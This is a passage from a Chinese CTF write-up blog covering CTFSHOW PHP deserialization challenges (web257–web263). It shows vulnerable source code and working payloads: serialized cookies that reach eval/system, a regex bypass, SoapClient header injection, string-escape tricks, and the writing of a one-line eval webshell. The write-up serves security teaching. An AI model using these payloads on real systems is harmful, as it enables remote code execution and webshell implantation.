class="line">    <span class="keyword">private</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>payload:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?username=xxxxxx&amp;password=xxxxxx </span><br><span class="line">    </span><br><span class="line">Cookie user=O%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>ctfShowUser%<span class="number">22</span>%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A21%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>ctfShowUser%<span class="number">00</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A21%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>ctfShowUser%<span class="number">00</span>password%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A18%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>ctfShowUser%<span class="number">00</span>isVip%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span><span class="keyword">class</span>%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>backDoor%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A14%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>backDoor%<span class="number">00</span>code%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A23%<span class="number">3</span>A%<span class="number">22</span>system%<span class="number">28</span>%<span class="number">22</span>cat+flag.php%<span class="number">22</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><ul><li>观察代码发现需要构造POP链</li><li>需要改值的只有backDoor类中的code值以及让其调用getInfo方法。</li><li>发现<code>__construct __destruct</code>魔术方法，在序列化以及反序列化会触发，使其执行class属性中的getInfo方法。</li><li>所以我们只需要让class属性改变即可。将其值改为backDoor类的对象，在序列化/反序列化就会调用class也就是backDoor中的getInfo方法。</li><li>最后改的值只有backDoor类中的code属性的值。</li></ul><h1 id="web258-正则绕过"><a href="#web258-正则绕过" class="headerlink" title="web258(+正则绕过)"></a>web258(+正则绕过)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>payload:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?username=xxxxxx&amp;password=xxxxxx</span><br><span class="line">    </span><br><span class="line">Cookie user=O%<span class="number">3</span>A%<span class="number">2</span>B11%<span class="number">3</span>A%<span class="number">22</span>ctfShowUser%<span class="number">22</span>%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A%<span class="number">2</span>B8%<span class="number">3</span>A%<span class="number">22</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A%<span class="number">2</span>B8%<span class="number">3</span>A%<span class="number">22</span>password%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>isVip%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span><span class="keyword">class</span>%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A%<span class="number">2</span>B8%<span class="number">3</span>A%<span class="number">22</span>backDoor%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>code%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A23%<span class="number">3</span>A%<span class="number">22</span>system%<span class="number">28</span>%<span class="number">27</span>cat+flag.php%<span class="number">27</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><ul><li>思路跟上题差不多，只是多了一个正则匹配</li><li><code>/[oc]:\d+:/i</code><ul><li><code>[oc]</code> 匹配<code>[]</code>中的任意一个字符</li><li><code>\d</code> 匹配0-9的任意数字</li><li><code>+</code> 多次进行匹配</li><li><code>i</code> 不区分大小写</li></ul></li><li>所以该正则表达式表达的是无论大写还是小写匹配符合<code>o/c:数字：</code>的形式</li><li>只需要在这写数字前面加<code>+</code>即可绕过</li></ul><h1 id="web259-SoapClient"><a href="#web259-SoapClient" class="headerlink" title="web259(SoapClient)"></a>web259(SoapClient)</h1><p><strong>hint</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">flag.php</span><br><span class="line"></span><br><span class="line"><span class="variable">$xff</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">array_pop</span>(<span class="variable">$xff</span>);</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">array_pop</span>(<span class="variable">$xff</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!==<span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$token</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$token</span>==<span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="variable">$flag</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>题目</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$vip</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br><span class="line"><span class="comment">//vip can get flag one key</span></span><br><span class="line"><span class="variable">$vip</span>-&gt;<span class="title function_ invoke__">getFlag</span>();</span><br></pre></td></tr></table></figure><p><code>payload:</code></p><ul><li>根据提示发现需要在flag.php下才能获取flag，尝试访问flag.php，发现如下结果</li></ul><p><img src="/img/CTFSHOW-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/ip.png" alt=""></p><ul><li>在看提示，发现是用HTTP头中的”X-Forwarded-For”字段来获取IP地址。</li><li><code>explode(string $delimiter , string $string)</code> <ul><li><code>$delimiter</code> 分隔符</li><li><code>$string</code> 输入的字符串</li><li>返回值为数组</li></ul></li><li><p><code>array_pop(array)</code></p><ul><li>返回值为array的最后一个值，如果数组为空，则返回NULL</li></ul></li><li><p>所以flag.php将传进去的XFF字段中的地址利用<code>.</code>分成数组，并利用<code>array_pop()</code>将地址的最后一个值弹出来作为ip地址</p></li><li><p>本题需要使用原生类的反序列化来实现，使用的原生类为<code>SoapClient</code></p></li><li>可以构造paylload</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ua</span> = <span class="string">&quot;ctfshow\r\nx-forwarded-for:127.0.0.1,127.0.0.1,127.0.0.1\r\nContent-Type: application/x-www-form-         urlencoded\r\nContent-Length: 13\r\n\r\ntoken=ctfshow&quot;</span>;</span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>, <span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1&#x27;</span>, <span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span>, <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="variable">$ua</span>));</span><br><span class="line"><span class="variable">$t</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$client</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$t</span>);</span><br></pre></td></tr></table></figure><h1 id="web260"><a href="#web260" class="headerlink" title="web260()"></a>web260()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow_i_love_36D/&#x27;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>])))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?ctfshow=ctfshow_i_love_36D</code></p><ul><li>根据题目传参即可</li></ul><h1 id="web261-php弱比较-远程命令执行"><a href="#web261-php弱比较-远程命令执行" class="headerlink" title="web261(php弱比较+远程命令执行)"></a>web261(php弱比较+远程命令执行)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!=<span class="string">&#x27;&#x27;</span> || <span class="variable language_">$this</span>-&gt;password!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="variable language_">$this</span>-&gt;username.<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;code==<span class="number">0x36d</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br></pre></td></tr></table></figure><p><strong>payload:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?vip=O:<span class="number">10</span>:<span class="string">&quot;ctfshowvip&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;877.php&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">25</span>:<span class="string">&quot;&lt;?php @eval(<span class="subst">$_POST</span>[&quot;</span><span class="number">1</span><span class="string">&quot;]);&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;code&quot;</span>;N;&#125; </span><br><span class="line"></span><br><span class="line">访问<span class="number">877</span>.php</span><br><span class="line"><span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /flag_is_here&#x27;</span>);</span><br></pre></td></tr></table></figure><ul><li>看源码可以发现<code>__construct __destruct</code> 这两个魔术方法是一定会触发的</li><li>通过<code>file_put_contents</code>函数发现可以写入文件，当内容为一句话木马时，可以造成远程命令执行</li><li>将username的值改为877.php，利用弱比较的方法绕过if判断，使文件名为877.php</li><li>将password的值改为一句话木马</li><li>访问877.php，发现可以访问！上传成功！</li></ul><h1 id="web262-字符串逃逸-增加"><a href="#web262-字符串逃逸-增加" class="headerlink" title="web262(字符串逃逸-增加)"></a>web262(字符串逃逸-增加)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$msg</span>));</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;msg&#x27;</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$umsg</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>根据注释里的信息发现还有个message.php文件，访问</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>payload:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f=<span class="number">1</span>&amp;m=<span class="number">1</span>&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck<span class="string">&quot;;s:5:&quot;</span>token<span class="string">&quot;;s:5:&quot;</span>admin<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><ul><li>结合上述代码，发现我们传进去的数据会存储在Cookie值中，且当token值为admin才能得到flag</li><li>利用字符串增加的方法，构造payload</li></ul><h1 id="web263-session反序列化"><a href="#web263-session反序列化" class="headerlink" title="web263(session反序列化)"></a>web263(session反序列化)</h1><p><img src="/img/CTFSHOW-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/ctfshow.png" alt=""></p><p><code>payload: 访问/log-1.php    1=system(&#39;cat flag.php&#39;);</code></p><ul><li>进去之后人都傻了（代码呢？？）</li><li>没有思路，先扫下目录吧</li></ul><p><img src="/img/CTFSHOW-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kali.png" alt=""></p><ul><li>发现有<code>www.zip</code>文件，下载，打开之后一个一个查看，发现这是个关于session的反序列化</li></ul><p><strong>index.php</strong></p><p><img src="/img/CTFSHOW-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/session_01.png" alt=""></p><p>显然我们可以通过cookie中的limit控制session中的limit，写入方式是php_serialize</p><p><strong>check.php</strong></p><p><img src="/img/CTFSHOW-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/session_02.png" alt=""></p><p>无论成功还是失败，都会重置session，这是我们不想看到的。所以不能访问check.php</p><p><strong>inc.php</strong></p><p><img src="/img/CTFSHOW-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/session.png" alt=""></p><p>看到了User类，这个类的__destruct方法是关键方法，可以用来写马，username是文件名，password是内容，完全可控</p><ul><li>即可构造payload</li></ul><blockquote><p>原理：在cookie写入后，session应该是这样的形式：</p><p>a:1:{s:5:”limit”;s:length:”可控的写入部分”}</p><p>然后，我们想要在inc.php读取的时候得到User类的序列化字符串：</p><p>O:4:”User”:3:{s:8:”username”;s:5:”1.php”;s:8:”password”;s:25:”&lt;?php 